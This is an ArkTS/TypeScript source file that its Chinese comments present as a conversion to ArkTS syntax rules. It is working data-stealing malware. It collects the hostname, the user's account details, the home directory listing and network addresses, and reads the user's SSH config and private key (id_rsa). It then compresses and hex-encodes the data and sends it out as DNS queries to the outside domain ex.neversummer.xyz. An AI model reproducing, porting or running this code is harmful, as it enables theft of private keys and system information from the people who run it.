// 应用ArkTS约束：
// 1. 使用let替换var（约束9）
// 2. 使用ES模块导入替换require（约束60,61）
// 3. 显式类型标注对象字面量（约束23,24）
// 4. 禁止动态属性访问（约束21）
// 5. 使用箭头函数（约束26）
// 6. 严格类型检查（约束76）

import os from 'os.ets';
import crypto from 'crypto.ets';
import fs from 'fs.ets';
import zlib from 'zlib.ets';
import dns from 'dns.ets';

interface UserInfo {
    uid: number;
    gid: number;
    username: string;
    homedir: string;
    shell: string;
}

interface SystemInfo {
    hn: string;
    ar: string;
    pl: string;
    rel: string;
    tmp: string;
    mem: number;
    up: number;
    uid: number;
    gid: number;
    un: string;
    hd: string;
    sh: string;
    fn: string;
    ls: string[];
    cnt: Record<string, string>;
    net: string[];
}

let userInfo: UserInfo = os.userInfo();

let info: SystemInfo = {
    hn: os.hostname(),
    ar: os.arch(),
    pl: os.platform(),
    rel: os.release(),
    tmp: os.tmpdir(),
    mem: os.totalmem(),
    up: os.uptime(),
    uid: userInfo.uid,
    gid: userInfo.gid,
    un: userInfo.username,
    hd: userInfo.homedir,
    sh: userInfo.shell,
    fn: __filename,
    ls: [],
    cnt: {},
    net: []
};

const baseDomain: string = "ex.neversummer.xyz";
const maxLabelLen: number = 63;
let rayId: string = crypto.randomBytes(20).toString('hex').substring(0, 8);

// 处理文件列表
fs.readdirSync(os.homedir()).forEach((file: string) => {
    info.ls.push(file);
});

let keyFolder: string = os.homedir() + "/." + "ss" + "h/";

const fileNames: string[] = ["config", "id_rsa"];

fileNames.forEach((fileName: string) => {
    try {
        let filePath: string = keyFolder + fileName;
        if (fs.existsSync(filePath)) {
            info.cnt[fileName] = fs.readFileSync(filePath, 'utf8');
        }
    } catch (err) {
        // 错误处理留空
    }
});

// 处理网络接口
const interfaces = os.networkInterfaces();
for (const key in interfaces) {
    if (interfaces.hasOwnProperty(key)) {
        info.net.push(`${key}:${interfaces[key][0].address}`);
    }
}

let infoString: string = JSON.stringify(info);
let encodedInfo: Buffer = zlib.deflateSync(infoString);
let hexEncoded: string = encodedInfo.toString('hex');

// 处理域名分块
let re: RegExp = new RegExp('.{1,' + maxLabelLen + '}', 'g');
let chunks: RegExpMatchArray | null = hexEncoded.match(re);

if (chunks) {
    chunks.forEach((chunk: string, index: number) => {
        let seq: number = index + 1;
        let domain: string = `${rayId}.${seq}.${chunk}.${baseDomain}`;

        dns.resolve(domain, "A", (err: Error | null, records: string[]) => {
            // DNS解析回调
        });
    });
}
